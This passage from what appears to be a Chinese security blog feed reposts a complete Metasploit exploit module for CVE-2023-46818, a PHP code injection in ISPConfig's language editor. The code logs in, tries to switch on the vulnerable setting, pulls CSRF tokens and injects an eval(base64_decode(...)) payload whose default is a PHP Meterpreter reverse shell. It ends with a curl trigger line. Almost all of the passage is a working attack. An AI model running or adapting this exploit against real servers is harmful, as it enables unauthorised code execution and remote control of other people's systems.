class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="hljs-comment"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetasploitModule</span> &lt; <span class="hljs-title class_ inherited__">Msf::Exploit::Remote</span><br>  <span class="hljs-title class_">Rank</span> = <span class="hljs-title class_">ExcellentRanking</span><br><br>  <span class="hljs-keyword">prepend</span> <span class="hljs-title class_">Msf</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Exploit</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Remote</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:AutoCheck</span><br>  <span class="hljs-keyword">include</span> <span class="hljs-title class_">Msf::Exploit::Remote::HttpClient</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">initialize</span>(<span class="hljs-params">info = &#123;&#125;</span>)<br>    <span class="hljs-variable language_">super</span>(<br>      update_info(<br>        info,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;ISPConfig language_edit.php PHP Code Injection&#x27;</span>,<br>        <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; <span class="hljs-string">%q&#123;</span><br><span class="hljs-string">          This module exploits a PHP code injection vulnerability in ISPConfig&#x27;s</span><br><span class="hljs-string">          language_edit.php file. The vulnerability occurs when the `admin_allow_langedit`</span><br><span class="hljs-string">          setting is enabled, allowing authenticated administrators to inject arbitrary</span><br><span class="hljs-string">          PHP code through the language editor interface.</span><br><span class="hljs-string">          </span><br><span class="hljs-string">          This module will automatically check if the required `admin_allow_langedit`</span><br><span class="hljs-string">          permission is enabled, and attempt to enable it if it&#x27;s disabled (requires</span><br><span class="hljs-string">          admin credentials with system configuration access).</span><br><span class="hljs-string">          </span><br><span class="hljs-string">          The exploit works by injecting a PHP payload into a language file, which</span><br><span class="hljs-string">          is then executed when the file is accessed. The payload is base64 encoded</span><br><span class="hljs-string">          and written using PHP&#x27;s file_put_contents function.</span><br><span class="hljs-string">        &#125;</span>,<br>        <span class="hljs-string">&#x27;License&#x27;</span> =&gt; <span class="hljs-variable constant_">MSF_LICENSE</span>,<br>        <span class="hljs-string">&#x27;Author&#x27;</span> =&gt; [<br>          <span class="hljs-string">&#x27;syfi&#x27;</span>, <span class="hljs-comment"># Discovery and PoC</span><br>          <span class="hljs-string">&#x27;Egidio Romano&#x27;</span><br>        ],<br>        <span class="hljs-string">&#x27;References&#x27;</span> =&gt; [<br>          [<span class="hljs-string">&#x27;CVE&#x27;</span>, <span class="hljs-string">&#x27;2023-46818&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://github.com/SyFi/CVE-2023-46818&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://karmainsecurity.com/KIS-2023-13&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://karmainsecurity.com/pocs/CVE-2023-46818.php&#x27;</span>]<br>        ],<br>        <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">&#x27;php&#x27;</span>,<br>        <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; <span class="hljs-variable constant_">ARCH_PHP</span>,<br>        <span class="hljs-string">&#x27;Targets&#x27;</span> =&gt; [<br>          [<br>            <span class="hljs-string">&#x27;Automatic PHP&#x27;</span>,<br>            &#123;<br>              <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">&#x27;php&#x27;</span>,<br>              <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; <span class="hljs-variable constant_">ARCH_PHP</span><br>            &#125;<br>          ]<br>        ],<br>        <span class="hljs-string">&#x27;Privileged&#x27;</span> =&gt; <span class="hljs-literal">false</span>,<br>        <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2023-10-24&#x27;</span>,<br>        <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&#x27;DefaultOptions&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;PAYLOAD&#x27;</span> =&gt; <span class="hljs-string">&#x27;php/meterpreter/reverse_tcp&#x27;</span><br>        &#125;,<br>        <span class="hljs-string">&#x27;Notes&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;Stability&#x27;</span> =&gt; [<span class="hljs-variable constant_">CRASH_SAFE</span>],<br>          <span class="hljs-string">&#x27;Reliability&#x27;</span> =&gt; [<span class="hljs-variable constant_">REPEATABLE_SESSION</span>],<br>          <span class="hljs-string">&#x27;SideEffects&#x27;</span> =&gt; [<span class="hljs-variable constant_">IOC_IN_LOGS</span>]<br>        &#125;<br>      )<br>    )<br><br>    register_options([<br>      <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;TARGETURI&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;The URI path to ISPConfig&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>]),<br>      <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;USERNAME&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;ISPConfig administrator username&#x27;</span>]),<br>      <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;PASSWORD&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;ISPConfig administrator password&#x27;</span>])<br>    ])<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span><br>    print_status(<span class="hljs-string">&#x27;Checking if the target is ISPConfig...&#x27;</span>)<br>    <span class="hljs-comment"># Always try to log in and parse version, since credentials are required</span><br>    <span class="hljs-comment"># Clear any existing cookies before login</span><br>    cookie_jar.clear<br>    <br>    login_res = send_request_cgi!(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login/&#x27;</span>),<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;username&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>],<br>        <span class="hljs-string">&#x27;password&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>],<br>        <span class="hljs-string">&#x27;s_mod&#x27;</span> =&gt; <span class="hljs-string">&#x27;login&#x27;</span><br>      &#125;,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    <span class="hljs-keyword">if</span> login_res &amp;&amp; (login_res.headers[<span class="hljs-string">&#x27;Location&#x27;</span>]&amp;.<span class="hljs-keyword">include</span>?(<span class="hljs-string">&#x27;admin&#x27;</span>) |<span class="hljs-params"></span>| login_res.body.downcase.<span class="hljs-keyword">include</span>?(<span class="hljs-string">&#x27;dashboard&#x27;</span>))<br>      <span class="hljs-comment"># Try to access the dashboard or settings page</span><br>      settings_res = send_request_cgi(&#123;<br>        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>        <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;help&#x27;</span>, <span class="hljs-string">&#x27;version.php&#x27;</span>),<br>        <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>      &#125;)<br>      <span class="hljs-keyword">if</span> settings_res<br>        doc = settings_res.get_html_document<br>        <span class="hljs-comment"># Try to find version in a span, div, or similar element</span><br>        version_element = doc.at(<span class="hljs-string">&#x27;//p[@class=&quot;frmTextHead&quot;]&#x27;</span>)<br>        <span class="hljs-keyword">if</span> version_element<br>          version_text = version_element.text<br>          version = version_text.split(<span class="hljs-string">&quot;:&quot;</span>)[<span class="hljs-number">1</span>].gsub(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<br>          version = <span class="hljs-title class_">Rex::Version</span>.new(version)<br>          <span class="hljs-keyword">if</span> version &lt; <span class="hljs-title class_">Rex::Version</span>.new(<span class="hljs-string">&#x27;3.2.11p1&#x27;</span>)<br>            print_good(<span class="hljs-string">&quot;ISPConfig version detected: <span class="hljs-subst">#&#123;version_text&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-title class_">CheckCode</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Vulnerable</span>(<span class="hljs-string">&quot;Version: <span class="hljs-subst">#&#123;version_text&#125;</span>&quot;</span>)<br>          <span class="hljs-keyword">end</span><br>        <span class="hljs-keyword">end</span><br>      <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">end</span><br>    <span class="hljs-title class_">CheckCode</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Safe</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">authenticate</span><br>    print_status(<span class="hljs-string">&quot;Attempting login with username &#x27;<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>]&#125;</span>&#x27; and password &#x27;<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>]&#125;</span>&#x27;&quot;</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login&#x27;</span>),<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;username&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>],<br>        <span class="hljs-string">&#x27;password&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>],<br>        <span class="hljs-string">&#x27;s_mod&#x27;</span> =&gt; <span class="hljs-string">&#x27;login&#x27;</span><br>      &#125;,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:NoAccess</span>, <span class="hljs-string">&#x27;Login request failed&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    <span class="hljs-keyword">if</span> res&amp;.code == <span class="hljs-number">302</span><br>      res = send_request_cgi(&#123;<br>        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>         <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login/&#x27;</span>,res&amp;.headers.fetch(<span class="hljs-string">&#x27;Location&#x27;</span>,<span class="hljs-literal">nil</span>))<br>      &#125;)<br>    <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">if</span> res.body.match(<span class="hljs-regexp">/Username or Password wrong/i</span>)<br>      fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:NoAccess</span>, <span class="hljs-string">&#x27;Login failed: Invalid credentials&#x27;</span>)<br>    <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">if</span> res.headers.fetch(<span class="hljs-string">&#x27;Location&#x27;</span>,<span class="hljs-literal">nil</span>)&amp;.<span class="hljs-keyword">include</span>?(<span class="hljs-string">&#x27;admin&#x27;</span>) |<span class="hljs-params"></span>|<br>       res.body.downcase.<span class="hljs-keyword">include</span>?(<span class="hljs-string">&#x27;dashboard&#x27;</span>)<br>      print_good(<span class="hljs-string">&#x27;Login successful!&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    <span class="hljs-keyword">end</span><br>    print_warning(<span class="hljs-string">&#x27;Login status unclear, attempting to continue...&#x27;</span>)<br>    <span class="hljs-literal">true</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">check_langedit_permission</span><br>    print_status(<span class="hljs-string">&#x27;Checking if admin_allow_langedit is enabled...&#x27;</span>)<br>    <br>    <span class="hljs-comment"># Try to access the language editor to see if it&#x27;s accessible</span><br>    edit_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;language_edit.php&#x27;</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    <br>    <span class="hljs-keyword">if</span> res&amp;.code == <span class="hljs-number">200</span> &amp;&amp; res.body.<span class="hljs-keyword">include</span>?(<span class="hljs-string">&#x27;language_edit&#x27;</span>)<br>      print_good(<span class="hljs-string">&#x27;Language editor is accessible - admin_allow_langedit appears to be enabled&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    <span class="hljs-keyword">elsif</span> res&amp;.code == <span class="hljs-number">403</span><br>      print_warning(<span class="hljs-string">&#x27;Language editor access denied - admin_allow_langedit may be disabled&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    <span class="hljs-keyword">else</span><br>      print_warning(<span class="hljs-string">&#x27;Could not determine language editor accessibility&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">enable_langedit_permission</span><br>    print_status(<span class="hljs-string">&#x27;Attempting to enable admin_allow_langedit...&#x27;</span>)<br>    <br>    <span class="hljs-comment"># Try to access the system settings page</span><br>    settings_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;system_config.php&#x27;</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; settings_url,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    <br>    <span class="hljs-keyword">unless</span> res &amp;&amp; res.code == <span class="hljs-number">200</span><br>      print_warning(<span class="hljs-string">&#x27;Could not access system configuration page&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    <span class="hljs-keyword">end</span><br>    <br>    doc = res.get_html_document<br>    csrf_id = doc.at(<span class="hljs-string">&#x27;input[name=&quot;_csrf_id&quot;]&#x27;</span>)&amp;.[](<span class="hljs-string">&#x27;value&#x27;</span>)<br>    csrf_key = doc.at(<span class="hljs-string">&#x27;input[name=&quot;_csrf_key&quot;]&#x27;</span>)&amp;.[](<span class="hljs-string">&#x27;value&#x27;</span>)<br>    <br>    <span class="hljs-keyword">unless</span> csrf_id &amp;&amp; csrf_key<br>      print_warning(<span class="hljs-string">&#x27;Could not extract CSRF tokens from system config page&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    <span class="hljs-keyword">end</span><br>    <br>    <span class="hljs-comment"># Try to enable the setting</span><br>    enable_data = &#123;<br>      <span class="hljs-string">&#x27;_csrf_id&#x27;</span> =&gt; csrf_id,<br>      <span class="hljs-string">&#x27;_csrf_key&#x27;</span> =&gt; csrf_key,<br>      <span class="hljs-string">&#x27;admin_allow_langedit&#x27;</span> =&gt; <span class="hljs-string">&#x27;1&#x27;</span>,<br>      <span class="hljs-string">&#x27;action&#x27;</span> =&gt; <span class="hljs-string">&#x27;save&#x27;</span><br>    &#125;<br>    <br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; settings_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; enable_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    <br>    <span class="hljs-keyword">if</span> res &amp;&amp; res.code == <span class="hljs-number">200</span><br>      print_good(<span class="hljs-string">&#x27;Successfully enabled admin_allow_langedit&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    <span class="hljs-keyword">else</span><br>      print_warning(<span class="hljs-string">&#x27;Failed to enable admin_allow_langedit&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">inject_payload</span><br>    print_status(<span class="hljs-string">&#x27;Injecting PHP payload...&#x27;</span>)<br>    <span class="hljs-variable">@payload_file</span> = <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;<span class="hljs-title class_">Rex</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Text</span>.rand_text_alpha_lower(<span class="hljs-number">8</span>)&#125;</span>.php&quot;</span><br>    b64_payload = <span class="hljs-title class_">Base64</span>.strict_encode64(payload.encoded)<br>    injection = <span class="hljs-string">&quot;&#x27;];eval(base64_decode(&#x27;<span class="hljs-subst">#&#123;b64_payload&#125;</span>&#x27;));die;#&quot;</span><br>    lang_file = <span class="hljs-title class_">Rex</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Text</span>.rand_text_alpha_lower(<span class="hljs-number">10</span>) + <span class="hljs-string">&quot;.lng&quot;</span><br>    edit_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;language_edit.php&#x27;</span>)<br>    initial_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file<br>    &#125;<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; initial_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&#x27;Unable to access language_edit.php&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    doc = res.get_html_document<br>    csrf_id = doc.at(<span class="hljs-string">&#x27;input[name=&quot;_csrf_id&quot;]&#x27;</span>)&amp;.[](<span class="hljs-string">&#x27;value&#x27;</span>)<br>    csrf_key = doc.at(<span class="hljs-string">&#x27;input[name=&quot;_csrf_key&quot;]&#x27;</span>)&amp;.[](<span class="hljs-string">&#x27;value&#x27;</span>)<br>    <span class="hljs-keyword">unless</span> csrf_id &amp;&amp; csrf_key<br>      fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&#x27;CSRF tokens not found!&#x27;</span>)<br>    <span class="hljs-keyword">end</span><br>    print_good(<span class="hljs-string">&quot;Extracted CSRF tokens: ID=<span class="hljs-subst">#&#123;csrf_id[<span class="hljs-number">0</span>..<span class="hljs-number">10</span>]&#125;</span>..., KEY=<span class="hljs-subst">#&#123;csrf_key[<span class="hljs-number">0</span>..<span class="hljs-number">10</span>]&#125;</span>...&quot;</span>)<br>    injection_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file,<br>      <span class="hljs-string">&#x27;_csrf_id&#x27;</span> =&gt; csrf_id,<br>      <span class="hljs-string">&#x27;_csrf_key&#x27;</span> =&gt; csrf_key,<br>      <span class="hljs-string">&#x27;records[\]&#x27;</span> =&gt; injection<br>    &#125;<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; injection_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&#x27;Injection request failed&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    payload_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-variable">@payload_file</span>)<br>    print_good(<span class="hljs-string">&quot;Payload successfully injected: <span class="hljs-subst">#&#123;<span class="hljs-variable">@payload_file</span>&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> payload_url<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span><br>    <span class="hljs-keyword">unless</span> authenticate<br>      fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:NoAccess</span>, <span class="hljs-string">&#x27;Login failed&#x27;</span>)<br>    <span class="hljs-keyword">end</span><br>    <br>    <span class="hljs-comment"># Check if language editor permissions are enabled</span><br>    <span class="hljs-keyword">unless</span> check_langedit_permission<br>      print_warning(<span class="hljs-string">&#x27;admin_allow_langedit appears to be disabled&#x27;</span>)<br>      print_status(<span class="hljs-string">&#x27;Attempting to enable admin_allow_langedit...&#x27;</span>)<br>      <br>      <span class="hljs-keyword">if</span> enable_langedit_permission<br>        print_good(<span class="hljs-string">&#x27;Successfully enabled admin_allow_langedit, retrying exploit...&#x27;</span>)<br>        <span class="hljs-comment"># Re-check permissions after enabling</span><br>        <span class="hljs-keyword">unless</span> check_langedit_permission<br>          fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&#x27;Failed to enable admin_allow_langedit or language editor still not accessible&#x27;</span>)<br>        <span class="hljs-keyword">end</span><br>      <span class="hljs-keyword">else</span><br>        fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&#x27;Could not enable admin_allow_langedit - exploit requires this setting to be enabled&#x27;</span>)<br>      <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">end</span><br>    <br>    payload_url = inject_payload<br>    print_status(<span class="hljs-string">&#x27;Starting payload handler...&#x27;</span>)<br>    print_status(<span class="hljs-string">&#x27;Manual trigger information:&#x27;</span>)<br>    print_line(<span class="hljs-string">&quot;URL: <span class="hljs-subst">#&#123;full_uri&#125;</span><span class="hljs-subst">#&#123;payload_url&#125;</span>&quot;</span>)<br>    print_line(<span class="hljs-string">&quot;Manual trigger: curl &#x27;<span class="hljs-subst">#&#123;full_uri&#125;</span><span class="hljs-subst">#&#123;payload_url&#125;</span>&#x27;&quot;</span>)<br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; ISPConfig language_edit.php PHP代码注入&lt;/p&gt;</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
    
    <category term="代码注入" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>SonicWall Email Security 权限控制漏洞</title>
    <link href="http://example.com/2025/06/30/github_443250844/"/>
    <id>http://example.com/2025/06/30/github_443250844/</id>
    <published>2025-06-30T15:00:17.972Z</published>
    <updated>2025-06-30T15:00:17.970Z</updated>
    
